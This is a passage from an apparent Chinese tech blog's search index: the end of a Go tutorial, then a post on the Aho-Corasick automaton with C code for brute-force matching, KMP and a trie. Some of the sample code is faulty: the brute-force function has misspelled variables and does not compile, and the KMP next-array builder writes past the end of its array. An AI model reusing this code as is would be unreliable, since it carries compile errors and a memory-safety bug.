class="keyword">func</span> <span class="title">sqrt</span><span class="params">(x <span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> sqrtRecursive(x, <span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">1e-9</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sqrtRecursive</span><span class="params">(x, guess, prevGuess, epsilon <span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">if</span> diff := guess*guess - x; diff &lt; epsilon &amp;&amp; -diff &lt; epsilon &#123;</span><br><span class="line"><span class="keyword">return</span> guess</span><br><span class="line">&#125;</span><br><span class="line">newGuess := (guess + x/guess) / <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> newGuess == prevGuess &#123;</span><br><span class="line"><span class="keyword">return</span> newGuess</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sqrtRecursive(x, newGuess, guess, epsilon)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。</p><p>接口可以让我们将不同的类型绑定到一组公共的方法上，从而实现多态和灵活的设计。</p><p>Go 语言中的接口是隐式实现的，也就是说，如果一个类型实现了一个接口定义的所有方法，那么它就自动地实现了该接口。因此，我们可以通过将接口作为参数来实现对不同类型的调用，从而实现多态。</p><blockquote><p>接口定义</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Shape <span class="keyword">interface</span> &#123;</span><br><span class="line">    Area() <span class="type">float64</span></span><br><span class="line">    Perimeter() <span class="type">float64</span></span><br><span class="line">&#125;    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*定义了一个Shape接口，该接口要求实现类型必须包含Area和Perimeter两个方法</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><blockquote><p>接口实现</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;    <span class="comment">//定义一个矩阵类型</span></span><br><span class="line">      Width <span class="type">float64</span></span><br><span class="line">      Height <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现 Shape 接口的 Area 和 Perimeter 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> Area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.Width * r.Height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r Rectangle)</span></span> Perimeter() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*r.Width + <span class="number">2</span>*r.Height</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AC自动机</title>
      <link href="/2023/11/21/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/"/>
      <url>/2023/11/21/AC%E8%87%AA%E5%8A%A8%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="AC自动机"><a href="#AC自动机" class="headerlink" title="AC自动机"></a>AC自动机</h2><p>AC自动机是最一种<strong>多模式匹配算法</strong>，它由贝尔实验室的两位研究人员Alfred V. Aho 和 Margaret J.Corasick 于1975年发明，几乎与KMP算法同时问世，至今仍然在模式匹配领域被广泛应用。<strong>例如：在一篇文章中，需要找到多个词汇所在的位置和出现频率。</strong></p><p>其核心算法仍是<strong>寻找模式串内部规律，进行每次失配的高效跳转</strong>。这点和KMP算法一致，不同点在于,AC自动机寻找模式串的相同前缀。</p><p>在这之前，先了解一下KMP算法和Trie数。</p><h3 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h3><h4 id="Brute-Force算法"><a href="#Brute-Force算法" class="headerlink" title="Brute-Force算法"></a>Brute-Force算法</h4><p>首先介绍字符串匹配问题——经典的Brute-Force算法</p><p>就是按照顺序移动字串，让其和主串做比较。当发现字串和主串对应相等后，就返回匹配到的主串的第一个字符的位置，C语言实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Brute_Forece</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *text,<span class="type">const</span> <span class="type">char</span> *pattren)</span>&#123;</span><br><span class="line">    <span class="type">int</span> textLentg = <span class="built_in">strlen</span>(text);</span><br><span class="line">    <span class="type">int</span> patternLength = (<span class="built_in">strlen</span>(pattern));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>;i &lt;= textLength - patternLength;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; patternLength;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(text[i+j] != pattern[j])&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j == patternLength)&#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>时间复杂度<strong>O(mn)</strong></p></blockquote><h4 id="KMP算法-1"><a href="#KMP算法-1" class="headerlink" title="KMP算法"></a>KMP算法</h4><p>原理就是在进行一次匹配之后就初步哦按段后续几趟匹配一定不会成功，然后跳过，具体做法是为主串中每一个字符添加一个Next值。</p><blockquote><p>next数组的定义为：next[i]表示模式串A[0]至A[i]这个字串，使得前k个字符等于后k个字符的最大值，特别的k不能取i+i,因为字串一共才i+1个字符，自己跟自己相等毫无意义。</p></blockquote><p>如何通过next数组来确定到底要跳多少步？  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主串:[A,B,A,B,A,A,B,A,A,B,A,C]</span><br><span class="line">  |</span><br><span class="line">子串:         [A,B,A,A,B,A,C]</span><br><span class="line">next数组:[0,0,1,1,2,3,0]</span><br></pre></td></tr></table></figure><ul><li>当字串和主串第一个匹配之后，成功匹配上3个字符</li><li>表示总共重复了next[3-1]&#x3D;next[2]&#x3D;1个，于是直接跳过：匹配上的次数-重复的个数&#x3D;3-1&#x3D;2步</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主串:[A,B,A,B,A,A,B,A,A,B,A,C]</span><br><span class="line">      |</span><br><span class="line">子串:             [A,B,A,A,B,A,C]</span><br><span class="line">next数组:    [0,0,1,1,2,3,0]</span><br></pre></td></tr></table></figure><ul><li>这一次匹配了6个，就是next[6-1]&#x3D;next[5]&#x3D;3</li><li>表示重复了3个，直接跳过6-3&#x3D;3步。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主串:[A,B,A,B,A,A,B,A,A,B,A,C]</span><br><span class="line">            |</span><br><span class="line">子串:                   [A,B,A,A,B,A,C]</span><br><span class="line">next数组:          [0,0,1,1,2,3,0]</span><br></pre></td></tr></table></figure><ul><li>匹配成功</li></ul><blockquote><p>所以关键就是建立next数组</p></blockquote><h5 id="Next数组"><a href="#Next数组" class="headerlink" title="Next数组"></a>Next数组</h5><blockquote><p>暴力构建法，时间复杂度为O(m^2)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">buildNextArr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next)</span> &#123;</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (k &lt; j &amp;&amp; pattern[k] == pattern[i - j + k]) &#123;</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k == j) &#123;</span><br><span class="line">                len = j + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        next[i] = len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>递推法构建，时间复杂度为O(n+m)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">buildNextRecursive</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == len) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == <span class="number">-1</span> || pattern[i] == pattern[j]) &#123;</span><br><span class="line">        next[i + <span class="number">1</span>] = j + <span class="number">1</span>;</span><br><span class="line">        buildNextRecursive(pattern, next, i + <span class="number">1</span>, j + <span class="number">1</span>, len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        buildNextRecursive(pattern, next, i, next[j], len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildNextArr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next)</span> &#123;</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    buildNextRecursive(pattern, next, <span class="number">0</span>, <span class="number">-1</span>, m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildNextRecursive</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == len) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == <span class="number">-1</span> || pattern[i] == pattern[j]) &#123;</span><br><span class="line">        next[i + <span class="number">1</span>] = j + <span class="number">1</span>;</span><br><span class="line">        buildNextRecursive(pattern, next, i + <span class="number">1</span>, j + <span class="number">1</span>, len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        buildNextRecursive(pattern, next, i, next[j], len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildNext</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pattern, <span class="type">int</span> *next)</span> &#123;</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    buildNextRecursive(pattern, next, <span class="number">0</span>, <span class="number">-1</span>, m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kmpSearch</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *text, <span class="type">const</span> <span class="type">char</span> *pattern)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="built_in">strlen</span>(text);</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> next[m];</span><br><span class="line">    buildNext(pattern, next);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n &amp;&amp; j &lt; m) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span> || text[i] == pattern[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == m) &#123;</span><br><span class="line">        <span class="keyword">return</span> i - m; <span class="comment">// 匹配成功，返回匹配的起始位置</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// 未找到匹配</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *text = <span class="string">&quot;ababcababcabcabc&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *pattern = <span class="string">&quot;abcabc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> result = kmpSearch(text, pattern);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Pattern found at position: %d\n&quot;</span>, result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Pattern not found.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Trie树"><a href="#Trie树" class="headerlink" title="Trie树"></a>Trie树</h3><p>Tire树也叫字典树，是一种特殊的前缀树结构。它是哈希树的一种变种，专门为字符串处理设计的数据结构。典型的应用是用于<strong>统计和排序大量的字符串</strong>（不限于字符串）因此经常被搜索引擎用于文字词频统计。它的优点是：最大限度地减少无谓的字符串比较。Trie的核心思想是空间换时间，<strong>利用字符串的公共前缀来降低查询时间的开销</strong>以达到提高效率的目的。</p><p>如图：</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231118100217713.png" alt="image-20231118100217713" style="zoom:50%;" /><blockquote><p>前缀树的3个<strong>基本性质</strong>：</p></blockquote><ul><li>根节点不包含字符，除根节点外每一个节点只包含一个字符。</li><li>从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。</li><li>每个节点的所有子节点包含的字符都不相同。</li></ul><blockquote><p>应用</p></blockquote><ul><li>**字符串检索:**事先将已知的一些字符串（字典）的有关信息保存到trie树里，查找另外一些未知字符串是否出现过或者出现频率。</li><li><strong>字符串最长公共前缀</strong>:Trie树利用多个字符串的公共前缀来节省存储空间，反之，当我们把大量字符串存储到一棵trie树上时，我们可以快速得到某些字符串的公共前缀。</li><li><strong>排序</strong>:Trie树是一棵多叉树，只要先遍历整棵树，输出相应的字符串便是按字典序排序的结果。</li></ul><h4 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALPHABET_SIZE 26    <span class="comment">//这里只考虑了26个英文小写字母。如果考虑中文就是加上特殊编，增加ALPHABET_SIZE</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trie 树节点结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">children</span>[<span class="title">ALPHABET_SIZE</span>];</span>    </span><br><span class="line">    <span class="type">int</span> isEndOfWord;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新的 Trie 节点，初始化</span></span><br><span class="line"><span class="keyword">struct</span> TrieNode* <span class="title function_">createTrieNode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> (<span class="keyword">struct</span> TrieNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TrieNode));</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">            node-&gt;children[i] = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node-&gt;isEndOfWord = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入字符串到 Trie 树</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="keyword">struct</span> TrieNode* root, <span class="type">const</span> <span class="type">char</span>* key)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; key[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> index = key[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;children[index] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            node-&gt;children[index] = createTrieNode();</span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;children[index];</span><br><span class="line">    &#125;</span><br><span class="line">    node-&gt;isEndOfWord = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索字符串在 Trie 树中是否存在</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="keyword">struct</span> TrieNode* root, <span class="type">const</span> <span class="type">char</span>* key)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">node</span> =</span> root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; key[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> index = key[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;children[index] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 未找到字符串</span></span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;children[index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (node != <span class="literal">NULL</span> &amp;&amp; node-&gt;isEndOfWord);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放 Trie 树的内存</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">freeTrie</span><span class="params">(<span class="keyword">struct</span> TrieNode* root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ALPHABET_SIZE; i++) &#123;</span><br><span class="line">        freeTrie(root-&gt;children[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TrieNode</span>* <span class="title">root</span> =</span> createTrieNode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入一些字符串</span></span><br><span class="line">    insert(root, <span class="string">&quot;apple&quot;</span>);</span><br><span class="line">    insert(root, <span class="string">&quot;app&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 搜索字符串</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, search(root, <span class="string">&quot;apple&quot;</span>) ? <span class="string">&quot;Found&quot;</span> : <span class="string">&quot;Not found&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, search(root, <span class="string">&quot;apples&quot;</span>) ? <span class="string">&quot;Found&quot;</span> : <span class="string">&quot;Not found&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 Trie 树的内存</span></span><br><span class="line">    freeTrie(root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AC自动机-1"><a href="#AC自动机-1" class="headerlink" title="AC自动机"></a>AC自动机</h3><p>核心算法仍是寻找模式串内部规律，进行每次失配的高效跳转。这点和KMP算法一致，不同点在于,AC自动机寻找模式串的相同前缀。</p><p>AC自动机使用前缀树来存放所有模式串的前缀，通过失配指针来处理失配的跳转。AC自动机的构建，<strong>首先需要构建Trie树，其次需要添加失配指针（fail表），最后需要模式匹配。</strong></p><blockquote><p>核心思想就是trie树的匹配模式，加上类似于KMP中next数组的fail表，来进行每次失配的高效跳转</p></blockquote><ul><li>构建Trie树</li></ul><p>之前已经讲过，不再赘述</p><ul><li>构建fail表</li></ul><p>构建fail表之前，我们需要明确，每个节点：父节点、子节点列表、fail节点、节点的值和是否是尾节点这几个属性组成：</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231118102636608.png" alt="image-20231118102636608" style="zoom:33%;" /><p>fail表中保存了失配时的fail指针，fail指针就是当前位置失配以后能够跳转继续进行匹配的字符位置，达到匹配过程中不需要回溯的效果。构建过程使用了BFS（宽度优先搜索）算法。<strong>搜索过程文字描述：</strong></p><p>假设当前节点为temp,  我们找到temp的父节点，得到父节点的fail节点，再找到fail节点的所有子节点，寻找子节点中是否有和temp节点值相同的节点，若存在则temp的fail节点指向该节点，如不存在继续寻找该fail节点的fail节点，直到找到与相同值的节点或达到root节点。</p><p><img src="C:\Users\杨欣然\AppData\Roaming\Typora\typora-user-images\image-20231118121207793.png" alt="image-20231118121207793"></p><p>不难发现构建出来的fail指针实际跟KMP算法的next数组类似。</p><ul><li>模式匹配</li></ul><p>参考：<a href="https://blog.csdn.net/bestsort/article/details/82947639">https://blog.csdn.net/bestsort/article/details/82947639</a></p><p>非常形象容易理解</p><h4 id="代码实现"><a href="#代码实现" class="headerlink" 